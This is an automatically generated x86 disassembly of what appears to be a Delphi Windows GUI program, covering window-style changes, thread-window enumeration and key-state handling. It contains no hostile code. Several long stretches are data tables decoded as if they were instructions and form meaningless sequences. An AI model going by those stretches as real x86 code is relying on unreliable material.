cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044b0
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404210
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044b0
jmp r-xdata
sub_45e618
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f50
mov ebx 0x1
mov eax esi
call sub_404210
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404138
sub_45e67c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e6d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45e584
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45e584
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f14
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e6dc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_45e6e4
adc al [ eax ]
add [ eax ] al
mov esp 0x7000480d
jl r-xdata
add [ ebp + ecx + 0x7cd00048 ] dl
add [ eax + 0x400480d ] bh
jl r-xdata
add [ eax ] al
add [ eax + 0xd ] bh
dec eax
add [ ebp + edi * 2 + 0x48 ] ah
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45e7dc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax + 0x6000480d ] dl
or [ eax ] 0x8c
or eax 0x80200048
dec eax
add [ ebp + ecx + 0x7b840048 ] dh
dec eax
add [ eax - 0x27ffb7f3 ] dh
jpo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e7e3
retn
mov edx [ r-xdata ]
call sub_4049cc
mov eax rw-data
call sub_403f50
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
mov eax [ rw-data ]
call sub_403154
add [ eax + 0x3000480d ] cl
or [ eax ] rw-data
in al dx
or [ eax ] 0x80
or eax 0x7ce40048
dec eax
add [ ebp + ecx - 0x7fe7ffb8 ] ch
dec eax
add [ eax - 0x1fffb7f3 ] ch
jpo r-xdata
add [ eax - 0x1bffb7f3 ] al
jl r-xdata
add [ ebp + ecx + 0x7e100048 ] ah
dec eax
add [ eax + 0x3800480d ] ah
jge r-xdata
mov eax rw-data
mov ecx 0x12
add [ ebp + ecx + 0x48 ] bh
add al bh
jl r-xdata
dec eax
add [ ebp + ecx - 0x7f3bffb8 ] bl
dec eax
add [ eax - 0x3fffb7f3 ] bl
or [ eax ] 0x94
or eax 0x7cd00048
sub_45e7e8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45e6e4
call sub_403c78
mov eax [ r-xdata ]
call sub_417be4
mov eax [ r-xdata ]
call sub_417c84
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417c30
mov eax [ r-xdata ]
call sub_417af4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429bb8
mov [ rw-data ] eax
sub_45e8d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
jmp r-xdata
outsd
outsb
je r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add bh bh
js r-xdata
call 0x4de9f5
add bh bh
or [ eax ] al
add bh bh
sbb [ esi + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
rol [ eax - 0x17 ] 0x45
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
jae r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
dec eax
adc al 0x46
add ah bl
adc al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
jmp [ eax + 0x13 ]
inc eax
jmp 0x114ce987
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
jmp 0x5e51e99e
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc [ eax + 0x1004614 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + 0x1004614 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
outsd
mov eax 0x45eb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
in al dx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 - 0x134dffbb ] cl
inc ebp
add [ edx + eax ] bl
add [ eax ] al
and [ esi + 0x44 ] bl
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
add [ eax ] al
add [ eax ] ch
jmp 0x8de93b
jmp r-xdata
adc eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
inc esp
adc eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xffffec ] al
add [ eax ] eax
add eax 0x6f6c6f43
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
dec esi
outsd
jb r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ edi + edx + 0x11f00046 ] cl
inc ebp
add [ edx + ebx * 8 + 0x44 ] bl
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
and [ esi + eax * 2 ] cl
add [ ecx ] dl
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax ] bh
sbb [ esi ] al
call 0x1c4632a3
sbb eax 0x60046
add eax 0x15011400
add [ eax + esi * 4 ] edi
in al dx
inc eax
jmp [ eax ]
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add al dh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
outsd
insb
outsd
jb r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ edi + edx ] dl
inc esi
add [ ecx + 0x12200045 ] al
inc ebp
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
call 0x1463120
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] ch
jmp r-xdata
sar [ eax + 0x45eb ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_45f601
xchg esp eax
xchg ecx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
aam 0x61
inc esp
add [ eax ] ah
add al [ eax ]
call [ edi + eax * 2 + 0x46 ]
add ah dl
cmp [ esi ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x69746341 ] cl
jbe r-xdata
add [ edi ] cl
inc ecx
insb
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
outsd
insb
sub al 0x47
inc esp
add [ ebx ] bl
add bh bh
xor al 0x93
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
out dx al
inc ebp
add [ eax ] ch
add al [ eax ]
outsd
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
[ eax + 0x6b ]
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
sub [ 0x2a800046 ] ch
insb
int3
fdiv [ esi ]
inc esi
add ah dl
cmp [ esi ] eax
add [ eax ] al
add [ eax + 0x7 ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ ecx + ebx + 0x2ab80046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
outsb
call 0x70463a49
add [ eax ] al
inc eax
lahf
inc esp
add ah bl
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jb r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
call 0xffffffffa544f84a
imul eax [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esi
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
push 0x58004498
sub eax 0x2a800046
inc esi
add [ eax ] al
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
in eax dx
inc ebp
add [ ecx ] ch
add al [ eax ]
dec [ eax ]
aaa
inc esi
add ah dl
cmp [ esi ] eax
add [ eax ] al
add [ eax + 0x2 ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and [ eax ] eax
push cs
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
inc esi
add [ eax + 0x462a ] al
popad
jo r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
and [ esi - 0x61afffbc ] bl
inc esp
add ah dl
cmp [ esi ] eax
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ eax + ebx * 4 ] ah
inc esp
add [ eax ] ch
sub eax 0x2a800046
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
popad
insb
jne r-xdata
out dx eax
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
call esp
cmp [ esi ] eax
add [ eax ] al
add [ eax + 0x3 ] al
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x4f00ffff ] ah
or [ ebp ] eax
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
add [ eax ] al
pop esp
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
add [ eax + 0x2d ] bl
inc esi
add [ eax + 0x462a ] al
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
cld
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
dec ebp
inc esp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
clc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov al 0x4d
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add [ eax ] al
jae r-xdata
and eax 0x2ec0042
add bh bh
nop
imul eax [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
or [ ebp ] al
or [ eax ] 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
sub_460384
mov edi 0xc8ffbdff
insd
inc esi
add al dh
insd
inc esi
add [ eax - 0x1fffb992 ] cl
outsb
inc esi
add [ edi + ebp * 2 + 0x6fcc0046 ] dh
inc esi
add [ esp + ebp * 2 + 0x46 ] cl
add [ eax ] dh
insd
inc esi
add [ ebp + ebp * 2 + 0x540f0046 ] bl
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
add al 0x46
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
add [ eax ] al
add [ eax + 0x4 ] bl
inc esi
rol [ ebx ] 0x46
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
add [ edx ] 0x46
add [ eax - 0xc ] dh
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
cmp al 0x10
inc eax
add [ eax ] ah
cmp eax 0x3d340046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
xor [ eax ] eax
inc esp
xor [ eax ] eax
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xb000408d
add al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
add al 0x46
add [ eax ] al
add eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x46
add [ eax + 0x24000000 ] ah
insb
inc ecx
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
outsb
arpl [ eax - 0x70 ] bp
pop eax
add al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_460634
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_460680
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469d9c
mov eax [ rw-data ]
call sub_42126c
mov eax [ rw-data ]
call sub_421214
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4606b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_460708
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4607ab
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_460774
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4606b8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607b2
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4607bc
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026fc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_4607f4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_460858
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_4607f4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4608b4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4608d4
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4608b4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_460900
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_46737c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4677ec
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407df8
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_467368
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4677d8
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407df8
test eax eax
je r-xdata
sub_46099c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4609f0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_460a2c
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_460a78
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460ad6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45e618
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404138
mov eax [ ebp - 0x8 ]
pop edx
call sub_407df8
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460add
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f74
retn
sub_460ae8
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_460b10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_460b81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_460ae8
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b88
lea eax [ ebp - 0xc ]
call sub_403f50
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
sub_460b90
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_460c20
push ebx
push esi
push edi
